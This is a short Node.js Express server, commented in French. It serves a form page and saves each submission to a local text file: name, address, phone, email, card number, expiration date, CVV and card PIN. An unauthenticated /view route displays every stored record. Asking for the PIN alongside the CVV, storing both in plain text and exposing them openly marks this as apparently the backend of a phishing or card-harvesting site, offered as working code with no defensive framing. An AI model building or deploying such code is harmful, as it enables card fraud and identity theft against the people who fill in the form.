const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000; // Port dynamique pour l'hébergement

app.use(bodyParser.urlencoded({ extended: true }));

// Servir le fichier HTML
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Enregistrer les données soumises dans un fichier local
app.post('/enregistrer', (req, res) => {
    const nom = req.body.nom;
    const prenom = req.body.prenom;
    const ville = req.body.ville;
    const codepostal = req.body.codepostal;
    const adresse = req.body.adresse;
    const telephone = req.body.telephone;
    const email = req.body.email;
    const carte = req.body.carte;
    const expiration = req.body.expiration;
    const cvv = req.body.cvv;
    const pin = req.body.pin;
    const data = `Nom: ${nom}, Prenom: ${prenom}, Ville: ${ville}, CodePostal: ${codepostal}, Adresse: ${adresse}, Téléphone: ${telephone}, Email: ${email}, NumeroDeCarte: ${carte}, DateExpiration: ${expiration}, CVV: ${cvv}, CodePin: ${pin}\n`;

    fs.appendFile('donnees.txt', data, (err) => {
        if (err) throw err;
        console.log('Données enregistrées');
    });

    res.send('Données validées et enregistrées.');
});

// Afficher le contenu du fichier donnees.txt
app.get('/view', (req, res) => {
    fs.readFile('donnees.txt', 'utf8', (err, data) => {
        if (err) {
            return res.status(500).send('Erreur lors de la lecture des données.');
        }
        res.send(`<html><body><h1>Contenu des données</h1><pre>${data}</pre></body></html>`);
    });
});

app.listen(port, () => {
    console.log(`Serveur démarré sur le port ${port}`);
});
